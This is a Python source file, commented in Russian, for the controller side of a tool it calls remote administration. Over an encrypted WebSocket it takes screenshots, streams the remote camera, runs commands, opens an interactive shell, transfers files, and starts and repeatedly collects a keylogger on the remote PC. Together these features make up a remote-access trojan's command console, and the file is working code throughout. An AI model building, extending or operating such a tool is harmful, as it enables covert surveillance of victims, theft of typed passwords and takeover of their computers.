"""
client.py — клиентская часть удалённого администрирования.

Запуск:
    python client.py --server IP_OR_HOST --port 8765 --secret YOUR_TOKEN

Команды в интерактивном режиме:
    screenshot          — получить скриншот удалённого ПК и показать
    stream              — запустить/остановить видеопоток с камеры
    exec <command>      — выполнить команду и получить вывод
    shell               — открыть интерактивную сессию командной строки
    send <local> <remote> — отправить файл на удалённый ПК
    recv <remote> <local> — получить файл с удалённого ПК
    keylog start        — запустить кейлоггер
    keylog stop         — остановить кейлоггер
    keylog get          — получить накопленные данные кейлоггера
    keylog auto         — автоматический мониторинг клавиатуры
    ping                — проверить соединение
    help                — список команд
    exit                — отключиться и выйти

Протокол: WebSocket + шифрование Fernet.
"""

import argparse
import asyncio
import base64
import logging
import os
import sys
import tempfile
import time
from pathlib import Path
from collections import deque
import threading

import websockets

from shared import CHUNK_SIZE, decrypt_msg, encrypt_msg, make_fernet

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("client")


# ===================================================================
# Helper: показать изображение
# ===================================================================
def show_image_b64(image_b64: str):
    try:
        from PIL import Image
        img_data = base64.b64decode(image_b64)
        img = Image.open(__import__("io").BytesIO(img_data))
        img.show()
        log.info("Скриншот открыт в просмотрщике")
    except Exception as e:
        log.error("Не удалось показать изображение: %s", e)
        path = Path(tempfile.gettempdir()) / "remote_screenshot.jpg"
        with open(path, "wb") as f:
            f.write(base64.b64decode(image_b64))
        log.info("Скриншот сохранён: %s", path)


# ===================================================================
# Helper: видеопоток через OpenCV в отдельной нити
# ===================================================================
class StreamViewer:
    def __init__(self):
        self.active = False
        self._thread = None

    def start(self):
        self.active = True
        try:
            import cv2
        except ImportError:
            log.error("opencv-python не установлен")
            self.active = False
            return
        cv2.namedWindow("Remote Camera", cv2.WINDOW_AUTOSIZE)
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.active = False

    def push_frame(self, frame_b64: str):
        if not self.active:
            return
        try:
            import cv2
            import numpy as np
            raw = base64.b64decode(frame_b64)
            nparr = np.frombuffer(raw, np.uint8)
            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if img is not None:
                cv2.imshow("Remote Camera", img)
                cv2.waitKey(1)
        except Exception as e:
            log.error("Ошибка рендера кадра: %s", e)

    def _loop(self):
        try:
            import cv2
        except ImportError:
            return
        while self.active:
            if cv2.getWindowProperty("Remote Camera", cv2.WND_PROP_VISIBLE) < 0.5:
                self.active = False
                break
            time.sleep(0.1)
        cv2.destroyAllWindows()


# ===================================================================
# Основной клиент
# ===================================================================
class RemoteClient:
    def __init__(self, uri, secret):
        self.uri = uri
        self.fernet = make_fernet(secret)
        self.secret = secret
        self.ws = None
        self.running = False
        self.stream_viewer = StreamViewer()
        self.shell_active = False
        self.authenticated = asyncio.Event()
        self._pending_futures = {}
        self._file_chunk_queue = asyncio.Queue()
        self._collecting_file = False
        self._shell_output_parts = []
        self._shell_output_ready = asyncio.Event()
        self._keylog_auto_running = False
        self._keylog_auto_task = None

    async def connect(self):
        while True:
            try:
                log.info("Подключение к %s ...", self.uri)
                self.ws = await websockets.connect(
                    self.uri,
                    ping_interval=30,
                    ping_timeout=10,
                )
                log.info("Соединение установлено")
                await self._authenticate()
                return True
            except Exception as e:
                log.error("Не удалось подключиться: %s. Повтор через 5 сек...", e)
                await asyncio.sleep(5)

    async def _authenticate(self):
        msg = {"type": "auth", "payload": {"token": self.secret}}
        await self.ws.send(encrypt_msg(self.fernet, msg))
        raw = await asyncio.wait_for(self.ws.recv(), timeout=10)
        resp = decrypt_msg(self.fernet, raw)
        if resp.get("type") == "auth_ok":
            log.info("Аутентификация успешна")
            self.authenticated.set()
            self.running = True
        else:
            log.error("Аутентификация отклонена сервером")
            await self.ws.close()
            sys.exit(1)

    async def _recv_loop(self):
        try:
            async for raw in self.ws:
                if not raw:
                    continue
                try:
                    msg = decrypt_msg(self.fernet, raw)
                except Exception:
                    continue

                t = msg.get("type")

                if t == "file_data" and self._collecting_file:
                    await self._file_chunk_queue.put(msg["payload"])
                    continue
                elif t == "error" and self._collecting_file:
                    await self._file_chunk_queue.put(None)
                    continue

                if t == "screenshot_data":
                    payload = msg["payload"]
                    log.info("Получен скриншот %dx%d", payload["width"], payload["height"])
                    threading.Thread(target=show_image_b64, args=(payload["image_b64"],), daemon=True).start()
                    self._resolve_future("screenshot", payload)

                elif t == "stream_frame":
                    self.stream_viewer.push_frame(msg["payload"]["frame_b64"])

                elif t == "exec_result":
                    self._resolve_future("exec", msg["payload"])

                elif t == "shell_output":
                    text = msg["payload"].get("stdout", "") + msg["payload"].get("stderr", "")
                    if text:
                        self._shell_output_parts.append(text)
                        self._shell_output_ready.set()

                elif t == "ack":
                    self._resolve_future("ack", msg["payload"])

                elif t == "pong":
                    self._resolve_future("ping", True)

                elif t == "keylog_data":
                    data = msg["payload"]["data"]
                    auto = msg["payload"].get("auto", False)
                    if data:
                        if auto:
                            print(f"\n🔑 [Auto] {data}")
                        else:
                            print(f"\n🔑 {data}")
                        sys.stdout.write("remote> ")
                        sys.stdout.flush()
                    else:
                        if not auto:
                            print("\n🔑 Лог пуст (нет записанных нажатий)")
                            sys.stdout.write("remote> ")
                            sys.stdout.flush()
                    self._resolve_future("keylog", data)

                elif t == "keylog_status":
                    status = msg["payload"]["status"]
                    emoji = "✅" if status == "started" else "⏹"
                    print(f"\n{emoji} Кейлоггер: {status}")
                    sys.stdout.write("remote> ")
                    sys.stdout.flush()
                    self._resolve_future("keylog_status", status)

                elif t == "error":
                    log.error("Сервер: %s", msg["payload"]["message"])

        except websockets.exceptions.ConnectionClosed:
            log.warning("Соединение закрыто сервером")
            self.running = False
        except Exception as e:
            log.exception("Ошибка приёма: %s", e)
            self.running = False

    def _resolve_future(self, key, value):
        fut = self._pending_futures.pop(key, None)
        if fut and not fut.done():
            fut.set_result(value)

    async def _wait_future(self, key, timeout=30):
        future = asyncio.get_event_loop().create_future()
        self._pending_futures[key] = future
        try:
            return await asyncio.wait_for(future, timeout=timeout)
        except asyncio.TimeoutError:
            self._pending_futures.pop(key, None)
            raise

    async def _send(self, msg):
        await self.ws.send(encrypt_msg(self.fernet, msg))

    # --- Команды ---

    async def cmd_screenshot(self, quality=80):
        log.info("Запрос скриншота...")
        await self._send({"type": "screenshot", "payload": {"quality": quality}})
        try:
            result = await self._wait_future("screenshot", timeout=15)
            print(f"\n✅ Скриншот получен: {result['width']}x{result['height']}")
        except asyncio.TimeoutError:
            log.error("Таймаут получения скриншота")

    async def cmd_stream_start(self, fps=15, quality=80):
        if not self.stream_viewer.active:
            self.stream_viewer.start()
        log.info("Запуск стрима (%d FPS)...", fps)
        await self._send({
            "type": "stream_start",
            "payload": {"fps": fps, "quality": quality},
        })
        print("📹 Стрим запущен. Повторная команда 'stream' остановит его.")

    async def cmd_stream_stop(self):
        log.info("Остановка стрима...")
        await self._send({"type": "stream_stop", "payload": {}})
        self.stream_viewer.stop()
        print("⏹ Стрим остановлен")

    async def cmd_exec(self, command, timeout=60):
        log.info("Выполнение: %s", command)
        await self._send({
            "type": "exec",
            "payload": {"command": command, "timeout": timeout},
        })
        try:
            result = await self._wait_future("exec", timeout=float(timeout) + 10)
            print("\n--- STDOUT ---")
            print(result.get("stdout", ""))
            if result.get("stderr"):
                print("\n--- STDERR ---")
                print(result["stderr"])
            print(f"\nExit code: {result.get('returncode', '?')}")
        except asyncio.TimeoutError:
            log.error("Таймаут выполнения команды")

    async def cmd_shell_open(self):
        log.info("Открытие shell...")
        self._shell_output_parts.clear()
        await self._send({"type": "shell_open", "payload": {}})
        self.shell_active = True
        print("\n🖥 Интерактивная shell-сессия (введите 'exit_shell' для выхода)")
        print("─" * 60)

    async def cmd_shell_input(self, data):
        await self._send({"type": "shell_input", "payload": {"data": data + "\n"}})

    async def cmd_shell_wait_output(self, timeout=2.0):
        self._shell_output_ready.clear()
        try:
            await asyncio.wait_for(self._shell_output_ready.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            pass
        text = "".join(self._shell_output_parts)
        self._shell_output_parts.clear()
        return text

    async def cmd_shell_close(self):
        await self._send({"type": "shell_close", "payload": {}})
        self.shell_active = False
        print("\n🖥 Shell закрыт")

    async def cmd_send_file(self, local_path, remote_path):
        if not os.path.exists(local_path):
            log.error("Файл не найден: %s", local_path)
            return
        file_size = os.path.getsize(local_path)
        log.info("Отправка: %s (%d байт) → %s", local_path, file_size, remote_path)
        print(f"📤 Отправка {local_path} → {remote_path} ...", end="", flush=True)
        with open(local_path, "rb") as f:
            raw_data = f.read()
        b64_data = base64.b64encode(raw_data).decode()
        total = max(1, -(-len(b64_data) // CHUNK_SIZE))
        for i in range(total):
            start = i * CHUNK_SIZE
            end = start + CHUNK_SIZE
            await self._send({
                "type": "file_send",
                "payload": {
                    "path": remote_path,
                    "data_b64": b64_data[start:end],
                    "chunk_index": i,
                    "total_chunks": total,
                },
            })
            if total > 1:
                progress = (i + 1) / total * 100
                print(f"\r   Отправлено: {i+1}/{total} ({progress:.0f}%)", end="", flush=True)
        try:
            await self._wait_future("ack", timeout=30)
            print(f"\n✅ Файл отправлен ({total} chunks)")
        except asyncio.TimeoutError:
            print("\n⚠ Нет подтверждения от сервера")

    async def cmd_recv_file(self, remote_path, local_path):
        log.info("Запрос файла: %s", remote_path)
        await self._send({"type": "file_recv", "payload": {"path": remote_path}})
        print(f"📥 Получение {remote_path}...", flush=True)
        self._collecting_file = True
        received_chunks = {}
        total_chunks = None
        timeout_at = time.monotonic() + 120
        try:
            while time.monotonic() < timeout_at:
                try:
                    payload = await asyncio.wait_for(self._file_chunk_queue.get(), timeout=3)
                except asyncio.TimeoutError:
                    if received_chunks:
                        log.warning("Таймаут между чанками...")
                        continue
                    else:
                        log.error("Таймаут приёма файла")
                        return
                if payload is None:
                    log.error("Сервер вернул ошибку при передаче файла")
                    return
                chunk_idx = payload["chunk_index"]
                received_chunks[chunk_idx] = payload
                if total_chunks is None:
                    total_chunks = payload["total_chunks"]
                progress = len(received_chunks) / total_chunks * 100
                print(f"\r   Получено: {chunk_idx+1}/{total_chunks} ({progress:.0f}%)", end="", flush=True)
                if len(received_chunks) >= total_chunks:
                    break
        finally:
            self._collecting_file = False
        print()
        if not received_chunks:
            log.error("Не получено данных файла")
            return
        filename = received_chunks[0].get("filename", "downloaded_file")
        local_full = Path(local_path)
        if local_full.is_dir():
            local_full = local_full / filename
        local_full.parent.mkdir(parents=True, exist_ok=True)
        b64_full = "".join(received_chunks[i]["data_b64"] for i in range(total_chunks))
        with open(local_full, "wb") as f:
            f.write(base64.b64decode(b64_full))
        file_size = local_full.stat().st_size
        print(f"✅ Файл сохранён: {local_full} ({file_size:,} байт)")

    async def cmd_ping(self):
        t0 = time.monotonic()
        await self._send({"type": "ping", "payload": {}})
        try:
            await self._wait_future("ping", timeout=5)
            latency_ms = (time.monotonic() - t0) * 1000
            print(f"✅ Пинг: {latency_ms:.0f} мс")
        except asyncio.TimeoutError:
            print("❌ Таймаут пинга")

    # --- Keylogger commands ---

    async def cmd_keylog_start(self):
        await self._send({"type": "keylog_start", "payload": {}})
        try:
            status = await self._wait_future("keylog_status", timeout=10)
            print(f"\n✅ Кейлоггер запущен (статус: {status})")
        except asyncio.TimeoutError:
            print("\n⚠ Нет ответа от сервера")

    async def cmd_keylog_stop(self):
        await self._send({"type": "keylog_stop", "payload": {}})
        try:
            status = await self._wait_future("keylog_status", timeout=10)
            print(f"\n✅ Кейлоггер остановлен (статус: {status})")
        except asyncio.TimeoutError:
            print("\n⚠ Нет ответа от сервера")

    async def cmd_keylog_get(self):
        await self._send({"type": "keylog_get", "payload": {}})
        try:
            data = await self._wait_future("keylog", timeout=10)
            if data is not None:
                print(f"\n🔑 Получено {len(data)} символов")
        except asyncio.TimeoutError:
            print("\n⚠ Нет ответа от сервера")

    async def cmd_keylog_auto_start(self):
        """Непрерывный мониторинг клавиатуры."""
        if self._keylog_auto_running:
            self._keylog_auto_running = False
            print("\n⏹ Авто-мониторинг остановлен")
            return
        self._keylog_auto_running = True
        print("\n🔑 Авто-мониторинг запущен (введите 'keylog auto' снова для остановки)")
        await self._send({"type": "keylog_start", "payload": {}})
        self._keylog_auto_task = asyncio.create_task(self._keylog_auto_loop())

    async def _keylog_auto_loop(self):
        while self._keylog_auto_running and self.running:
            await self._send({"type": "keylog_get", "payload": {}})
            try:
                await self._wait_future("keylog", timeout=15)
            except asyncio.TimeoutError:
                pass
            await asyncio.sleep(10)
        if self._keylog_auto_running:
            await self._send({"type": "keylog_stop", "payload": {}})
        self._keylog_auto_running = False

    # --- Главный цикл ---

    async def run_cli(self):
        await self.authenticated.wait()
        recv_task = asyncio.create_task(self._recv_loop())

        print("\n" + "=" * 60)
        print("  Remote Admin Client — управляющий ПК")
        print("=" * 60)
        print("""  Команды:
  screenshot          — получить скриншот
  stream              — запустить/остановить камеру
  exec <command>      — выполнить команду
  shell               — интерактивная оболочка
  send <local> <remote> — отправить файл
  recv <remote> <local> — получить файл
  keylog start        — запустить кейлоггер
  keylog stop         — остановить кейлоггер
  keylog get          — получить данные кейлоггера
  keylog auto         — непрерывный мониторинг клавиатуры
  ping                — проверка соединения
  help                — справка
  exit                — отключиться
""")

        stream_active = False

        while self.running:
            try:
                line = await asyncio.get_event_loop().run_in_executor(None, input, "remote> ")
            except EOFError:
                break
            except Exception:
                continue

            parts = line.strip().split(maxsplit=1)
            if not parts:
                continue

            cmd = parts[0].lower()
            args = parts[1] if len(parts) > 1 else ""

            try:
                if self.shell_active:
                    if args.lower() in ("exit_shell", "quit_shell", "exit"):
                        await self.cmd_shell_close()
                    else:
                        await self.cmd_shell_input(args)
                        output = await self.cmd_shell_wait_output(timeout=3.0)
                        if output:
                            print(output[:4096])
                    continue

                if cmd == "exit":
                    break
                elif cmd == "help":
                    self._print_help()
                elif cmd == "screenshot":
                    quality = 80
                    if args:
                        try:
                            quality = int(args)
                        except ValueError:
                            pass
                    await self.cmd_screenshot(quality)
                elif cmd == "stream":
                    if not stream_active:
                        fps = 15
                        if args:
                            try:
                                fps = int(args)
                            except ValueError:
                                pass
                        await self.cmd_stream_start(fps=fps)
                        stream_active = True
                    else:
                        await self.cmd_stream_stop()
                        stream_active = False
                elif cmd == "exec":
                    if not args:
                        print("Использование: exec <command>")
                        continue
                    await self.cmd_exec(args)
                elif cmd == "shell":
                    await self.cmd_shell_open()
                elif cmd == "send":
                    send_args = args.split()
                    if len(send_args) < 2:
                        print("Использование: send <local_path> <remote_path>")
                        continue
                    await self.cmd_send_file(send_args[0], send_args[1])
                elif cmd == "recv":
                    remote_path, local_path = args.split(maxsplit=1)
                    await self.cmd_recv_file(remote_path, local_path)
                elif cmd == "ping":
                    await self.cmd_ping()
                elif cmd == "keylog":
                    if args.startswith("auto"):
                        await self.cmd_keylog_auto_start()
                    elif args.startswith("start"):
                        await self.cmd_keylog_start()
                    elif args.startswith("stop"):
                        await self.cmd_keylog_stop()
                    elif args.startswith("get"):
                        await self.cmd_keylog_get()
                    else:
                        print("Использование: keylog start | stop | get | auto")
                else:
                    print(f"Неизвестная команда: {cmd}. Введите 'help'.")
            except Exception as e:
                log.exception("Ошибка: %s", e)

        # Cleanup
        if self._keylog_auto_running:
            self._keylog_auto_running = False
            if self._keylog_auto_task:
                self._keylog_auto_task.cancel()
        if self.shell_active:
            await self.cmd_shell_close()
        if stream_active:
            await self.cmd_stream_stop()
        self.running = False
        recv_task.cancel()
        if self.ws:
            await self.ws.close()
        log.info("Клиент остановлен")

    @staticmethod
    def _print_help():
        print("""
Доступные команды:
  screenshot [quality]       Получить скриншот (quality: 1-100, по умолч. 80)
  stream [fps]               Запустить/остановить видеопоток с камеры
  exec <command>             Выполнить команду на удалённом ПК
  shell                      Открыть интерактивную сессию командной строки
  send <local> <remote>      Отправить файл на удалённый ПК
  recv <remote> <local>      Получить файл с удалённого ПК
  keylog start               Запустить кейлоггер
  keylog stop                Остановить кейлоггер
  keylog get                 Получить накопленные данные
  keylog auto                Непрерывный мониторинг (автостоп повторной командой)
  ping                       Проверить соединение
  help                       Показать эту справку
  exit                       Отключиться и выйти
""")


# ===================================================================
# Точка входа
# ===================================================================
def main():
    parser = argparse.ArgumentParser(
        description="Client для удалённого администрирования ПК",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Пример:
  python client.py --server 192.168.1.100 --port 8765 --secret mypassword
""",
    )
    parser.add_argument("--server", required=True, help="Адрес сервера (IP или домен)")
    parser.add_argument("--port", type=int, default=8765, help="Порт сервера (по умолч. 8765)")
    parser.add_argument("--secret", required=True, help="Общий секрет (токен)")
    args = parser.parse_args()

    uri = f"ws://{args.server}:{args.port}"
    client = RemoteClient(uri, args.secret)

    async def run():
        connected = await client.connect()
        if connected:
            await client.run_cli()

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\n⚠ Прервано пользователем")
    except Exception as e:
        log.exception("Критическая ошибка: %s", e)


if __name__ == "__main__":
    main()
